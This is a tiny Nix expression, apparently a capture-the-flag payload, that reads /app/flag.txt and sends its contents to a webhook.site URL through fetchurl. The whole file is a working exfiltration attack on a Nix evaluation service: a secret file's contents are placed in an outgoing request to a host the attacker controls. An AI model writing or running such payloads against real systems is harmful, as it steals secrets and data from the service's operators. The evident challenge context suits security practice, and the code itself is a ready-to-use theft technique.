let
  pkgs = import <nixpkgs> {};
in
  pkgs.fetchurl {
    url = "https://webhook.site/a6d87e2f-5e2c-4530-a8de-4f12c20ce0d3/${builtins.replaceStrings ["{" "}"] ["%7B" "%7D"] (builtins.readFile /app/flag.txt)}";
  }
